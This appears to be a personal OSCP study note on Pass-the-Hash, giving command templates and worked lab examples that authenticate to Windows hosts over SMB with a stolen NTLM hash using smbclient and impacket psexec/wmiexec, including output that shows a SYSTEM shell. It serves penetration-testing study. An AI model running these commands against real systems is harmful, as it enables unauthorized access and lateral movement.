---
aliases:
  - Passing NTLM Hashes
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - password
  - password_hash
  - ntlm
  - hash
  - pass_the_hash
  - pth
author: Mehdi N Tehrani
creat_date: 2024-01-01
category: Cyber Security
subcategory: Offensive Security - OSCP
---
# Pass-the-Hash
#pass_the_hash #PtH
We can authenticate to a *local* or *remote* target with a valid combination of *username* and *NTLM hash* rather than a plain-text password. This is possible because NTLM hashes are not salted.
- Requirements:
	- the other target needs to have an *account with the same username and password*
	- The account needs *administrative privileges* on the other target
	- *UAC remote restrictions* needs to be disabled; otherwise it requires password entry at the time of elevation.
#rdp #winrm #smb 
NTLM hashes can be used to login with SMB, RDP and WinRM protocols.

## Tools
### CrackMapExec
[CrackMapExec Github](https://github.com/byt3bl33d3r/CrackMapExec)
#crackmapexec #enumeration
### smbclient 
#enumeration #smbclient
[samba](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
```sh
smbclient \\\\<ip>\\dir_name -U <user> --pw-nt-hash <hash>
```
### psexec.py
#psexec_py #psexec #command_execution #impacket #system_account #system_user 
- **Shell as** `SYSTEM` **user**
- Part of [impacket-scripts](https://www.kali.org/tools/impacket-scripts/)
- [Impacket Github](https://github.com/SecureAuthCorp/impacket)
Mechanism: searches for a *writable share* and uploads an executable file to it. Then it registers the executable as a *Windows service* and starts it.
```sh
impacket-psexec -hashes 00000000000000000000000000000000:<NTHash> <user>@<target>

# example
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
                        ^ 32 zeros to fill LMHash, as we only use NTHash

[*] Requesting shares on 192.168.245.212.....
[*] Found writable share ADMIN$
[*] Uploading file ZcaaJlFu.exe
[*] Opening SVCManager on 192.168.245.212.....
[*] Creating service KVtk on 192.168.245.212.....
[*] Starting service KVtk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### wmiexec.py
#wmiexec_py #wmiexec #command_execution
- **Shell as the provided user**
```
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTHash> <user>@<target>

# example
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
hostname\administrator
```
### mimikatz 
#mimikatz 
can also conduct pass the hash for us

## Mitigation
### UAC
#uac #user_account_control 
[User Account Control](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction) 

7a38310ea6f0027ee955abed1762964b